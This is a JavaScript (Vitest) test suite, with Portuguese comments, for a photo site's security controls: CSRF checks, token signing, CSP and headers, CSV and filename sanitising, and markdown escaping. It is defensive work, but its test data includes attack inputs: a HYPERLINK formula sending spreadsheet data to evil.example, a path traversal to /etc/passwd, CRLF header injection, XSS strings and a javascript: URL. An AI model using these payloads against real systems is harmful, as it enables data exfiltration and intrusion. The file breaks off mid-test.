// Suíte dos controles de segurança.
//
// A regra que orienta o que entra aqui: um controle de segurança falha em
// silêncio. Um cabeçalho que sumiu, uma CSP que voltou a aceitar tudo, uma
// checagem de origem que passou a deixar passar — nada disso quebra uma tela,
// nada disso aparece num teste funcional, e é exatamente por isso que precisa
// de um teste próprio afirmando o comportamento negativo ("isto tem que ser
// recusado"), não só o positivo.

import { describe, it, expect } from 'vitest';
import {
  isCrossSiteRequest, signToken, verifyToken, sanitizeFilename, validatePassword,
  generateNonce, contentSecurityPolicy, htmlSecurityHeaders, adminHtmlSecurityHeaders,
  dataSecurityHeaders, honeypotTripped, honeypotFieldHTML, HONEYPOT_FIELD,
} from '../src/security.js';
import { csvCell, stripImageMetadata, bytesFromBase64, base64FromBytes, sessionCookie, clientFingerprint, TERMS_VERSION, verifySession, readCounter } from '../src/utils.js';
import { withDurableObjects } from './helpers/do.js';
import worker, { sanitizeRestoredRequest, FORM_TOKEN_TTL_SECS, FORM_TOKEN_MIN_AGE_SECS, signingSecretProblem, SIGNING_SECRET_MIN_LENGTH, mintFormToken, trimRequests } from '../src/index.js';
import { renderMarkdown, resolveDocHref } from '../src/ui/markdown.js';
import { eventHTML } from '../src/ui/event.js';
import { degradedHealth, resetDegraded } from '../src/utils.js';
import { LEGAL_DOCS } from '../src/content/legal-docs.js';
import { readFileSync } from 'node:fs';

// Lidos como texto para as guardas estruturais: há acoplamentos entre cliente e
// servidor (nome de campo de formulário) que nenhum tipo garante e cujo modo de
// falha é o silêncio.
const indexSource = readFileSync(new URL('../src/index.js', import.meta.url), 'utf8');
const eventSource = readFileSync(new URL('../src/ui/event.js', import.meta.url), 'utf8');

const SECRET = 'segredo-de-teste-para-hmac';

// ---------------------------------------------------------------------------
describe('isCrossSiteRequest (CSRF)', () => {
  const req = (headers, url = 'https://fotos.lucafchala.com/api/events') =>
    new Request(url, { method: 'POST', headers });

  it('accepts same-origin and user-initiated requests', () => {
    expect(isCrossSiteRequest(req({ 'Sec-Fetch-Site': 'same-origin' }))).toBe(false);
    expect(isCrossSiteRequest(req({ 'Sec-Fetch-Site': 'none' }))).toBe(false);
  });

  it('rejects cross-site requests', () => {
    expect(isCrossSiteRequest(req({ 'Sec-Fetch-Site': 'cross-site' }))).toBe(true);
  });

  it('rejects same-SITE requests, which SameSite=Strict would have allowed', () => {
    // Este é o caso que motiva a checagem existir. O cookie de sessão é
    // SameSite=Strict, e "Strict" é escopo de SITE: um subdomínio hostil de
    // lucafchala.com envia o cookie normalmente. Sec-Fetch-Site distingue
    // origem de site, e é aqui que a diferença aparece.
    expect(isCrossSiteRequest(req({ 'Sec-Fetch-Site': 'same-site' }))).toBe(true);
  });

  it('falls back to Origin when Sec-Fetch-Site is absent', () => {
    expect(isCrossSiteRequest(req({ Origin: 'https://fotos.lucafchala.com' }))).toBe(false);
    expect(isCrossSiteRequest(req({ Origin: 'https://evil.example' }))).toBe(true);
    expect(isCrossSiteRequest(req({ Origin: 'lixo-que-nao-e-url' }))).toBe(true);
  });

  it('compares Origin against the request host, not a hardcoded domain', () => {
    // O mesmo Worker atende produção, *.workers.dev e o localhost do
    // `wrangler dev`. Fixar o domínio de produção quebraria os outros dois.
    const r = new Request('https://fotos.lucafchala.workers.dev/api/events', {
      method: 'POST',
      headers: { Origin: 'https://fotos.lucafchala.workers.dev' },
    });
    expect(isCrossSiteRequest(r)).toBe(false);
  });

  it('allows requests with no browser signal at all (curl is not CSRF)', () => {
    expect(isCrossSiteRequest(req({}))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
describe('signed tokens', () => {
  it('round-trips a token for the right purpose and scope', async () => {
    const t = await signToken(SECRET, { purpose: 'drive', scope: 'casamento', ttlSecs: 3600 });
    const r = await verifyToken(SECRET, t, { purpose: 'drive', scope: 'casamento', ttlSecs: 3600 });
    expect(r.ok).toBe(true);
  });

  it('rejects a token minted for a different slug', async () => {
    // O ponto inteiro do nonce de página: um token obtido carregando /evento-a
    // não pode servir para pedir o link de /evento-b. Sem isto, um token
    // Turnstile válido varre o site.
    const t = await signToken(SECRET, { purpose: 'drive', scope: 'evento-a', ttlSecs: 3600 });
    const r = await verifyToken(SECRET, t, { purpose: 'drive', scope: 'evento-b', ttlSecs: 3600 });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('invalid');
  });

  it('rejects a token minted for a different purpose', async () => {
    const t = await signToken(SECRET, { purpose: 'form', scope: 'suporte', ttlSecs: 3600 });
    const r = await verifyToken(SECRET, t, { purpose: 'drive', scope: 'suporte', ttlSecs: 3600 });
    expect(r.ok).toBe(false);
  });

  it('rejects a token signed with another secret', async () => {
    const t = await signToken('outro-segredo', { purpose: 'drive', scope: 's', ttlSecs: 3600 });
    expect((await verifyToken(SECRET, t, { purpose: 'drive', scope: 's', ttlSecs: 3600 })).ok).toBe(false);
  });

  it('reports expiry separately from forgery', async () => {
    // A distinção não é cosmética: 'expired' vira 410 e o cliente recarrega a
    // página sozinho; 'invalid' vira 403 e é tratado como ataque. Trocar os
    // dois transformaria "aba aberta desde ontem" em tela de erro.
    const t = await signToken(SECRET, { purpose: 'drive', scope: 's', ttlSecs: -10 });
    const r = await verifyToken(SECRET, t, { purpose: 'drive', scope: 's', ttlSecs: -10 });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('expired');
  });

  it('does not leak expiry status for a forged token', async () => {
    // Um token forjado com exp no futuro tem que cair em 'invalid'. Se a
    // verificação de prazo viesse antes da assinatura, um atacante aprenderia
    // que o formato estava certo e só a data errada.
    const forged = `${Math.floor(Date.now() / 1000 + 9999).toString(36)}.AAAA`;
    const r = await verifyToken(SECRET, forged, { purpose: 'drive', scope: 's', ttlSecs: 3600 });
    expect(r.reason).toBe('invalid');
  });

  it('rejects missing and malformed tokens', async () => {
    for (const bad of ['', 'sem-ponto', '.', 'zzz.zzz']) {
      expect((await verifyToken(SECRET, bad, { purpose: 'drive', scope: 's', ttlSecs: 60 })).ok).toBe(false);
    }
  });

  it('enforces a minimum age against instant submissions', async () => {
    const t = await signToken(SECRET, { purpose: 'form', scope: 'suporte', ttlSecs: 7200 });
    const fresh = await verifyToken(SECRET, t, {
      purpose: 'form', scope: 'suporte', ttlSecs: 7200, minAgeSecs: 3,
    });
    expect(fresh.ok).toBe(false);
    expect(fresh.reason).toBe('too-fast');

    // Sem piso de idade, o mesmo token passa — confirma que a reprovação acima
    // veio da idade e não de outro defeito do token.
    expect((await verifyToken(SECRET, t, { purpose: 'form', scope: 'suporte', ttlSecs: 7200 })).ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
describe('csvCell (injeção de fórmula)', () => {
  it('neutralises every formula-triggering leading character', () => {
    // Estes campos são preenchidos por quem visita o site (nome no gate do
    // Drive, User-Agent, Referer) e abrem no Excel do admin.
    for (const payload of ['=1+1', '+1', '-1', '@SUM(A1)', '\t=1', '\r=1']) {
      const cell = csvCell(payload);
      expect(cell.replace(/^"/, '').startsWith("'")).toBe(true);
    }
  });

  it('neutralises a real exfiltration payload', () => {
    const attack = '=HYPERLINK("https://evil.example/?x="&A1,"clique aqui")';
    const cell = csvCell(attack);
    expect(cell).toMatch(/^"'=HYPERLINK/);
  });

  it('leaves ordinary values untouched', () => {
    expect(csvCell('Maria Silva')).toBe('Maria Silva');
    expect(csvCell('casamento-ana-joao')).toBe('casamento-ana-joao');
    expect(csvCell(42)).toBe('42');
    expect(csvCell(null)).toBe('');
  });

  it('still quotes and escapes embedded quotes and commas', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('diz "oi"')).toBe('"diz ""oi"""');
  });

  it('strips control characters that could forge the file structure', () => {
    expect(csvCell('ok\x00\x07ok')).toBe('okok');
  });
});

// ---------------------------------------------------------------------------
describe('sanitizeFilename', () => {
  it('strips path traversal', () => {
    expect(sanitizeFilename('../../../etc/passwd')).toBe('passwd.jpg');
    expect(sanitizeFilename('..\\..\\windows\\system32\\a.png')).toBe('a.png');
  });

  it('strips CR/LF that would forge the MIME attachment header', () => {
    const out = sanitizeFilename('foto.jpg\r\nContent-Type: text/html');
    expect(out).not.toMatch(/[\r\n]/);
  });

  it('normalises a double extension to a single image extension', () => {
    expect(sanitizeFilename('foto.jpg.exe')).toBe('foto_jpg.jpg');
    expect(sanitizeFilename('script.php')).toBe('script.jpg');
  });

  it('keeps legitimate names and known image extensions', () => {
    expect(sanitizeFilename('minha-foto.png')).toBe('minha-foto.png');
    expect(sanitizeFilename('IMG_2043.HEIC')).toBe('IMG_2043.heic');
  });

  it('falls back for empty or dot-only input', () => {
    expect(sanitizeFilename('')).toBe('foto.jpg');
    expect(sanitizeFilename('...')).toBe('foto.jpg');
    expect(sanitizeFilename(null)).toBe('foto.jpg');
  });
});

// ---------------------------------------------------------------------------
describe('validatePassword', () => {
  it('rejects what the old 6-character rule accepted', () => {
    for (const weak of ['123456', 'senha1', 'abc123', 'aaaaaa']) {
      expect(validatePassword(weak).ok).toBe(false);
    }
  });

  it('rejects predictable patterns and project-specific guesses', () => {
    expect(validatePassword('password1234').ok).toBe(false);
    expect(validatePassword('qwerty123456').ok).toBe(false);
    expect(validatePassword('lucafchala123').ok).toBe(false);
    expect(validatePassword('aaaaaaaaaaaaaa').ok).toBe(false);
  });

  it('accepts a strong mixed password', () => {
    expect(validatePassword('Tr0vao-Verde!42').ok).toBe(true);
  });

  it('accepts a long passphrase without symbol gymnastics', () => {
    // Exigir símbolo numa frase de 30 caracteres é atrito sem ganho de entropia.
    expect(validatePassword('cavalo bateria grampo correto azul').ok).toBe(true);
  });

  it('rejects absurdly long input that would blow the hashing CPU budget', () => {
    expect(validatePassword('a1B!'.repeat(200)).ok).toBe(false);
  });

  it('rejects non-strings', () => {
    expect(validatePassword(null).ok).toBe(false);
    expect(validatePassword(123456789012).ok).toBe(false);
  });
});

// ---------------------------------------------------------------------------
describe('cabeçalhos de segurança', () => {
  it('gives every HTML page the full baseline', () => {
    const h = htmlSecurityHeaders(generateNonce());
    expect(h['X-Content-Type-Options']).toBe('nosniff');
    expect(h['X-Frame-Options']).toBe('DENY');
    expect(h['Strict-Transport-Security']).toMatch(/max-age=63072000/);
    expect(h['Cross-Origin-Opener-Policy']).toBe('same-origin');
    expect(h['Origin-Agent-Cluster']).toBe('?1');
    expect(h['X-Permitted-Cross-Domain-Policies']).toBe('none');
    expect(h['Permissions-Policy']).toMatch(/camera=\(\)/);
    expect(h['Permissions-Policy']).toMatch(/geolocation=\(\)/);
  });

  it('never lets a data response be cached', () => {
    // /api/metrics, /api/backup e /api/consent/export devolvem dados pessoais.
    // Sem no-store eles encostam em cache de disco e de intermediário.
    const h = dataSecurityHeaders('application/json; charset=utf-8');
    expect(h['Cache-Control']).toMatch(/no-store/);
    expect(h['Referrer-Policy']).toBe('no-referrer');
    expect(h['Content-Security-Policy']).toMatch(/default-src 'none'/);
    expect(h['Content-Security-Policy']).toMatch(/sandbox/);
  });

  it('allows caching only where explicitly opted in', () => {
    const h = dataSecurityHeaders('text/plain; charset=utf-8', { store: true });
    expect(h['Cache-Control']).toBeUndefined();
  });

  it('keeps admin pages out of caches and search engines', () => {
    const h = adminHtmlSecurityHeaders(generateNonce());
    expect(h['Cache-Control']).toMatch(/no-store/);
    expect(h['X-Robots-Tag']).toMatch(/noindex/);
    expect(h['Referrer-Policy']).toBe('no-referrer');
  });
});

// ---------------------------------------------------------------------------
describe('Content-Security-Policy', () => {
  const nonce = generateNonce();

  it('NEVER puts a nonce in the enforced policy while inline handlers exist', () => {
    // Este é o teste mais importante do arquivo. Pela CSP Level 3, a presença
    // de um nonce faz o browser DESCARTAR o 'unsafe-inline'. Ou seja,
    // `'self' 'unsafe-inline' 'nonce-x'` não é "os dois" — é só o nonce, e
    // todo handler onclick="…" para de executar: galeria, carrossel, gate do
    // Drive, modal de remoção e o painel inteiro morrem juntos.
    //
    // Já aconteceu uma vez, e só foi pego em verificação com browser real —
    // porque um teste sobre o TEXTO da política não enxerga a SEMÂNTICA dela.
    // Este teste existe para que não aconteça de novo.
    const enforced = contentSecurityPolicy(nonce);
    expect(enforced).not.toContain('nonce-');
    expect(enforced.split('; ').find(d => d.startsWith('script-src'))).toContain("'unsafe-inline'");
  });

  it('carries the per-request nonce in the strict (report-only) policy', () => {
    expect(contentSecurityPolicy(nonce, { strict: true })).toContain(`'nonce-${nonce}'`);
  });

  it('never permits eval, plugins or framing', () => {
    const csp = contentSecurityPolicy(nonce);
    expect(csp).not.toContain("'unsafe-eval'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'self'");
  });

  it('drops unsafe-inline in the strict (report-only) policy', () => {
    // A política estrita é a que queremos passar a impor. Ela existe em
    // Report-Only justamente para medir quantos handlers inline sobraram antes
    // da virada — ver o comentário em contentSecurityPolicy().
    const strict = contentSecurityPolicy(nonce, { strict: true });
    const scriptSrc = strict.split('; ').find(d => d.startsWith('script-src'));
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(scriptSrc).toContain(`'nonce-${nonce}'`);
  });

  it('keeps the enforced policy hard everywhere except inline scripts', () => {
    // O 'unsafe-inline' é a única concessão. Se alguém o remover antes de os
    // handlers saírem do HTML, a UI quebra — e se acrescentar um nonce ao lado
    // dele, quebra igual (teste acima). Todo o resto continua fechado.
    const enforced = contentSecurityPolicy(nonce);
    expect(enforced).toContain("object-src 'none'");
    expect(enforced).toContain("base-uri 'none'");
    expect(enforced).toContain("frame-ancestors 'none'");
    expect(enforced).not.toContain("'unsafe-eval'");
  });

  it('routes violations to the collector', () => {
    expect(contentSecurityPolicy(nonce, { strict: true })).toContain('report-uri /api/csp-report');
  });
});

describe('generateNonce', () => {
  it('produces a fresh, unpredictable value per call', () => {
    const seen = new Set(Array.from({ length: 200 }, () => generateNonce()));
    expect(seen.size).toBe(200);
    for (const n of seen) expect(n).toMatch(/^[A-Za-z0-9_-]{20,}$/);
  });
});

// ---------------------------------------------------------------------------
describe('honeypot', () => {
  it('trips only on a filled field', () => {
    expect(honeypotTripped('')).toBe(false);
    expect(honeypotTripped('   ')).toBe(false);
    expect(honeypotTripped(undefined)).toBe(false);
    expect(honeypotTripped('http://spam.example')).toBe(true);
  });

  it('renders a field hidden from people and from autofill', () => {
    // Um honeypot que o autofill do browser preenche deixa de barrar bot e
    // passa a barrar visitante.
    const html = honeypotFieldHTML();
    expect(html).toContain(`name="${HONEYPOT_FIELD}"`);
    expect(html).toContain('tabindex="-1"');
    expect(html).toContain('autocomplete="off"');
    expect(html).toContain('aria-hidden="true"');
  });
});

// ---------------------------------------------------------------------------
describe('cookie de sessão', () => {
  it('uses the __Host- prefix with the attributes that prefix requires', () => {
    const c = sessionCookie('a'.repeat(64));
    expect(c).toMatch(/^__Host-session=/);
    expect(c).toContain('Path=/');
    expect(c).toContain('Secure');
    expect(c).toContain('HttpOnly');
    expect(c).toContain('SameSite=Strict');
    // Com Domain, o browser recusa o prefixo __Host- — e é justamente o Domain
    // que permitiria a um vizinho de domínio plantar a sessão.
    expect(c).not.toContain('Domain=');
  });

  it('expires the cookie when clearing', () => {
    expect(sessionCookie('', { clear: true })).toContain('Max-Age=0');
  });
});

describe('clientFingerprint', () => {
  it('is stable for the same client and different across clients', () => {
    const mk = ua => new Request('https://x/', { headers: { 'User-Agent': ua } });
    expect(clientFingerprint(mk('Mozilla/5.0 A'))).toBe(clientFingerprint(mk('Mozilla/5.0 A')));
    expect(clientFingerprint(mk('Mozilla/5.0 A'))).not.toBe(clientFingerprint(mk('Mozilla/5.0 B')));
  });
});

// ---------------------------------------------------------------------------
describe('stripImageMetadata', () => {
  // JPEG mínimo: SOI + APP1(EXIF com uma carga reconhecível) + SOS + EOI.
  function jpegWithExif() {
    const exifPayload = [...'Exif\0\0GPSLatitude:-23.5505'].map(c => c.charCodeAt(0));
    const len = exifPayload.length + 2;
    return new Uint8Array([
      0xFF, 0xD8,
      0xFF, 0xE1, (len >> 8) & 0xFF, len & 0xFF, ...exifPayload,
      0xFF, 0xDA, 0x00, 0x02,
      0x11, 0x22, 0x33,
      0xFF, 0xD9,
    ]);
  }

  it('removes the EXIF segment from a JPEG', () => {
    const original = jpegWithExif();
    const { base64, stripped, format } = stripImageMetadata(base64FromBytes(original));
    expect(stripped).toBe(true);
    expect(format).toBe('jpeg');

    const out = bytesFromBase64(base64);
    // A coordenada de GPS que o celular gravou não pode sobreviver.
    expect(new TextDecoder().decode(out)).not.toContain('GPSLatitude');
    expect(out.length).toBeLessThan(original.length);
    // …e o resultado ainda é um JPEG: SOI na frente, dados da imagem no fim.
    expect(out[0]).toBe(0xFF);
    expect(out[1]).toBe(0xD8);
    expect(Array.from(out.slice(-2))).toEqual([0xFF, 0xD9]);
  });

  it('keeps the compressed scan data byte for byte', () => {
    const out = bytesFromBase64(stripImageMetadata(base64FromBytes(jpegWithExif())).base64);
    // 0x11 0x22 0x33 são os "pixels" do fixture: a limpeza poda contêiner, não
    // recodifica imagem.
    expect(Array.from(out)).toEqual(expect.arrayContaining([0x11, 0x22, 0x33]));
  });

  it('removes the eXIf chunk from a PNG', () => {
    const sig = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
    const chunk = (type, data) => {
      const t = [...type].map(c => c.charCodeAt(0));
      const len = data.length;
      return [(len >>> 24) & 255, (len >>> 16) & 255, (len >>> 8) & 255, len & 255, ...t, ...data, 0, 0, 0, 0];
    };
    const png = new Uint8Array([
      ...sig,
      ...chunk('IHDR', [0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]),
      ...chunk('eXIf', [...'GPS-AQUI'].map(c => c.charCodeAt(0))),
      ...chunk('IDAT', [1, 2, 3]),
      ...chunk('IEND', []),
    ]);
    const { base64, stripped } = stripImageMetadata(base64FromBytes(png));
    expect(stripped).toBe(true);
    const decoded = new TextDecoder().decode(bytesFromBase64(base64));
    expect(decoded).not.toContain('GPS-AQUI');
    expect(decoded).toContain('IHDR');
    expect(decoded).toContain('IDAT');
    expect(decoded).toContain('IEND');
  });

  it('returns the original untouched for formats it cannot safely rewrite', () => {
    // GIF/HEIC passam intactos de propósito: mexer neles sem um decodificador
    // de verdade arrisca corromper a prova que o titular enviou. O resultado
    // fica registrado (stripped=false) em vez de fingir que limpou.
    const gif = new Uint8Array([...'GIF89a'].map(c => c.charCodeAt(0)).concat([0, 0, 0, 0, 0, 0, 0, 0]));
    const b64 = base64FromBytes(gif);
    const r = stripImageMetadata(b64);
    expect(r.stripped).toBe(false);
    expect(r.base64).toBe(b64);
  });

  it('never throws or truncates on malformed input', () => {
    for (const junk of ['', 'not-base64!!', base64FromBytes(new Uint8Array([0xFF, 0xD8, 0xFF]))]) {
      const r = stripImageMetadata(junk);
      expect(r).toHaveProperty('base64');
      expect(r.stripped).toBe(false);
    }
  });
});

// ---------------------------------------------------------------------------
describe('sanitizeRestoredRequest', () => {
  it('keeps a well-formed record', () => {
    const clean = sanitizeRestoredRequest({
      id: 'abcdef01', eventSlug: 'casamento', eventTitle: 'Casamento',
      method: 'number', value: '42', email: 'a@b.c', phone: '11999999999',
      resolved: true, createdAt: '2026-01-01T00:00:00Z',
    });
    expect(clean.id).toBe('abcdef01');
    expect(clean.resolved).toBe(true);
    expect(clean.email).toBe('a@b.c');
  });

  it('drops records that cannot be deduplicated or resolved', () => {
    expect(sanitizeRestoredRequest(null)).toBeNull();
    expect(sanitizeRestoredRequest('uma string')).toBeNull();
    expect(sanitizeRestoredRequest([])).toBeNull();
    expect(sanitizeRestoredRequest({ email: 'a@b.c' })).toBeNull();       // sem id
    expect(sanitizeRestoredRequest({ id: { $ne: null } })).toBeNull();     // id não-string
    expect(sanitizeRestoredRequest({ id: 'NÃO-HEX' })).toBeNull();
  });

  it('discards unknown keys and wrong-typed values instead of passing them through', () => {
    const clean = sanitizeRestoredRequest({
      id: 'ab12', email: { toString: 'objeto onde o template espera string' },
      campoInventado: 'x', fileBase64: 'AAAA',
    });
    expect(clean.email).toBeUndefined();
    expect(clean.campoInventado).toBeUndefined();
    // O binário nunca volta para o KV, mesmo vindo no arquivo.
    expect(clean.fileBase64).toBeNull();
  });

  it('truncates over-long strings', () => {
    const clean = sanitizeRestoredRequest({ id: 'ab12', message: 'x'.repeat(5000) });
    expect(clean.message.length).toBe(1000);
  });
});

// ---------------------------------------------------------------------------
// Portão de CSRF no dispatcher
// ---------------------------------------------------------------------------
// A checagem de origem vive antes do roteamento de propósito: o modo de falha
// desse controle é o esquecimento, e uma rota nova escrita daqui a um ano não
// pode depender de alguém lembrar de chamá-lo. Estes testes vão pelo
// `fetch()` de verdade, não pela função auxiliar, para provar que o portão
// está no caminho e não só disponível.
describe('CSRF no dispatcher', () => {
  function kv(initial = {}) {
    const store = new Map(Object.entries(initial));
    return {
      async get(k) { return store.has(k) ? store.get(k) : null; },
      async put(k, v) { store.set(k, v); },
      async delete(k) { store.delete(k); },
      async list({ prefix = '' } = {}) {
        return { keys: [...store.keys()].filter(k => k.startsWith(prefix)).map(name => ({ name })), list_complete: true };
      },
    };
  }
  const ctx = { waitUntil: () => {} };
  const post = (path, headers = {}) => new Request(`https://fotos.lucafchala.com${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: '{}',
  });

  it('blocks cross-site writes before any handler runs', async () => {
    for (const path of ['/api/events', '/api/suporte', '/api/drive-link', '/dashboard/login', '/api/backup/restore']) {
      const res = await worker.fetch(post(path, { 'Sec-Fetch-Site': 'cross-site' }), { FOTOS: kv() }, ctx);
      expect(res.status, path).toBe(403);
    }
  });

  it('blocks same-site writes, which the SameSite=Strict cookie alone allowed', async () => {
    const res = await worker.fetch(post('/api/events', { 'Sec-Fetch-Site': 'same-site' }), { FOTOS: kv() }, ctx);
    expect(res.status).toBe(403);
  });

  it('lets same-origin writes through to the handler (401 here, not 403)', async () => {
    // 401 significa que a requisição CHEGOU ao handler e foi barrada pela
    // autenticação — ou seja, o portão de CSRF deixou passar como devia.
    const res = await worker.fetch(post('/api/events', { 'Sec-Fetch-Site': 'same-origin' }), { FOTOS: kv() }, ctx);
    expect(res.status).toBe(401);
  });

  it('never blocks reads', async () => {
    const res = await worker.fetch(
      new Request('https://fotos.lucafchala.com/robots.txt', { headers: { 'Sec-Fetch-Site': 'cross-site' } }),
      { FOTOS: kv() }, ctx);
    expect(res.status).toBe(200);
  });

  it('ships the security headers on public pages and on error pages alike', async () => {
    // Uma página 404 sem nosniff/X-Frame-Options continua sendo conteúdo
    // servido pela nossa origem.
    for (const path of ['/', '/__nao_existe__']) {
      const res = await worker.fetch(new Request(`https://fotos.lucafchala.com${path}`), { FOTOS: kv() }, ctx);
      expect(res.headers.get('X-Content-Type-Options'), path).toBe('nosniff');
      expect(res.headers.get('X-Frame-Options'), path).toBe('DENY');
      expect(res.headers.get('Content-Security-Policy'), path).toMatch(/frame-ancestors 'none'/);
      expect(res.headers.get('Strict-Transport-Security'), path).toMatch(/max-age=/);
    }
  });

  it('binds the report-only nonce to the one in the markup', async () => {
    // Um nonce no HTML que não bate com o do cabeçalho equivale a não ter nonce
    // nenhum. Como o nonce vive só na política estrita, é o cabeçalho
    // Report-Only que precisa casar com a marcação — é ele que mede o que falta
    // para a virada.
    const res = await worker.fetch(new Request('https://fotos.lucafchala.com/'), { FOTOS: kv() }, ctx);
    const ro = res.headers.get('Content-Security-Policy-Report-Only');
    const headerNonce = ro.match(/'nonce-([A-Za-z0-9_-]+)'/)[1];
    expect(await res.text()).toContain(`nonce="${headerNonce}"`);
    // E o enforced não pode carregar nonce nenhum, senão a página trava.
    expect(res.headers.get('Content-Security-Policy')).not.toContain('nonce-');
  });

  it('gives every response a fresh nonce', async () => {
    const get = async () => (await worker.fetch(
      new Request('https://fotos.lucafchala.com/'), { FOTOS: kv() }, ctx
    )).headers.get('Content-Security-Policy-Report-Only').match(/'nonce-([A-Za-z0-9_-]+)'/)[1];
    expect(await get()).not.toBe(await get());
  });
});

describe('CSP sem nonce (páginas de erro)', () => {
  it('omits the nonce source instead of emitting an empty one', () => {
    // `'nonce-'` vazio é sintaticamente inválido: o browser descarta o token e
    // a política passa a valer por acidente, não por intenção. Páginas de erro
    // não têm script, então a fonte simplesmente não aparece.
    const csp = contentSecurityPolicy('', { strict: true });
    expect(csp).not.toContain("'nonce-'");
    expect(csp).toContain("script-src 'self' https://challenges.cloudflare.com");
    // O resto da política continua inteiro numa página de erro.
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("object-src 'none'");
  });
});

// ---------------------------------------------------------------------------
describe('Central de Transparência (/legal)', () => {
  function kv() {
    const store = new Map([['events', '[]']]);
    return { async get(k) { return store.has(k) ? store.get(k) : null; }, async put(k, v) { store.set(k, v); },
      async delete(k) { store.delete(k); }, async list() { return { keys: [], list_complete: true }; } };
  }
  const ctx = { waitUntil: () => {} };
  const get = p => worker.fetch(new Request('https://fotos.lucafchala.com' + p), { FOTOS: kv() }, ctx);

  it('serves the hub at /legal and at /compliance', async () => {
    for (const p of ['/legal', '/compliance']) {
      const res = await get(p);
      expect(res.status, p).toBe(200);
      expect(res.headers.get('Content-Type'), p).toMatch(/text\/html/);
    }
  });

  it('renders no unresolved template values', async () => {
    // A página é montada por template string a partir de constantes. Um nome
    // errado numa interpolação não quebra nada — só imprime "undefined" no meio
    // de uma página institucional, que é o pior lugar para isso acontecer.
    const body = await (await get('/legal')).text();
    expect(body).not.toContain('undefined');
    expect(body).not.toContain('[object');
    expect(body).not.toContain('${');
  });

  it('keeps the mandatory legal documents one click away', async () => {
    // O rodapé passou a ter um único link "Legal" no lugar de "Privacidade" e
    // "Termos". Isso só é aceitável enquanto esta página realmente levar aos
    // dois — se um deles sumir daqui, ele fica inalcançável pelo rodapé.
    const body = await (await get('/legal')).text();
    expect(body).toContain('href="/privacidade"');
    expect(body).toContain('href="/termos"');
    expect(body).toContain('privacidade@lucafchala.com');
    expect(body).toContain('security@lucafchala.com');
    expect(body).toContain('gov.br/anpd');
  });

  it('pins the Terms version it advertises to the one actually in force', async () => {
    // A página anuncia a versão dos Termos. Se ela ficar para trás de
    // TERMS_VERSION, o site passa a exibir publicamente um número errado sobre
    // o texto que as pessoas aceitaram.
    const body = await (await get('/legal')).text();
    expect(body).toContain(TERMS_VERSION);
  });

  it('is reachable from the footer of every public page', async () => {
    for (const p of ['/', '/privacidade', '/termos', '/sobre', '/suporte', '/equipamentos', '/legal']) {
      const body = await (await get(p)).text();
      expect(body, p).toContain('href="/legal" class="legal-link"');
    }
  });

  it('is listed in the sitemap', async () => {
    expect(await (await get('/sitemap.xml')).text()).toContain('/legal</loc>');
  });
});

// ---------------------------------------------------------------------------
describe('token de formulário pré-envelhecido', () => {
  it('lets a corrected resubmission through immediately', async () => {
    // Cenário real: a pessoa esquece de marcar o consentimento, leva o erro,
    // marca e clica de novo em dois segundos. Sem o pré-envelhecimento ela
    // levaria "envio rápido demais" por cima do primeiro erro — atrito criado
    // pela própria defesa anti-bot.
    const preAged = await signToken(SECRET, {
      purpose: 'form', scope: 'suporte',
      ttlSecs: FORM_TOKEN_TTL_SECS - FORM_TOKEN_MIN_AGE_SECS,
    });
    const r = await verifyToken(SECRET, preAged, {
      purpose: 'form', scope: 'suporte',
      ttlSecs: FORM_TOKEN_TTL_SECS, minAgeSecs: FORM_TOKEN_MIN_AGE_SECS,
    });
    expect(r.ok).toBe(true);
  });

  it('still stops an instant first submission', async () => {
    // O piso continua valendo para o token normal — é o primeiro envio que ele
    // existe para filtrar.
    const fresh = await signToken(SECRET, { purpose: 'form', scope: 'suporte', ttlSecs: FORM_TOKEN_TTL_SECS });
    const r = await verifyToken(SECRET, fresh, {
      purpose: 'form', scope: 'suporte',
      ttlSecs: FORM_TOKEN_TTL_SECS, minAgeSecs: FORM_TOKEN_MIN_AGE_SECS,
    });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('too-fast');
  });
});

// ---------------------------------------------------------------------------
describe('markdown dos documentos legais', () => {
  it('escapes HTML before applying any formatting', () => {
    // A regra do renderizador: escapar primeiro, formatar depois. Se a ordem
    // inverter, uma tag no markdown vira uma tag no HTML — que é exatamente
    // como sanitizadores de markdown costumam falhar.
    const { html } = renderMarkdown('<script>alert(1)</script> e <img src=x onerror=alert(1)>');
    // O que importa é que nenhuma TAG sobreviva. A sequência "onerror=" continua
    // aparecendo — como texto visível dentro de `&lt;img …&gt;`, inerte. Exigir
    // que a substring suma seria testar a coisa errada e levaria a "consertar"
    // um comportamento correto.
    expect(html).not.toContain('<script');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;script&gt;');
    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;');
  });

  it('never emits a link to GitHub', () => {
    // Regra do site: só o link de código-fonte do rodapé leva ao GitHub. O
    // rótulo sobrevive como texto; o link some.
    const { html } = renderMarkdown('veja o [repositório](https://github.com/lucafchala/fotos)');
    expect(html).not.toContain('github.com');
    expect(html).toContain('repositório');
    expect(html).not.toContain('<a ');
  });

  it('rewrites sibling document links to site routes', () => {
    expect(renderMarkdown('[ROPA](./ROPA.md)').html).toContain('href="/legal/registro-de-operacoes"');
    expect(renderMarkdown('[Segurança](../../SECURITY.md)').html).toContain('href="/legal/politica-de-seguranca"');
  });

  it('demotes links to repo files that are not published', () => {
    // ./TODO.md e ../../LEGAL.md não têm página. Um href para eles seria um
    // link quebrado numa página institucional.
    for (const src of ['[TODO](./TODO.md)', '[Legal](../../LEGAL.md)', '[código](../../src/ui/privacy.js)']) {
      expect(renderMarkdown(src).html).not.toContain('<a ');
    }
  });

  it('rejects script-executing schemes', () => {
    expect(resolveDocHref('javascript:alert(1)')).toBeNull();
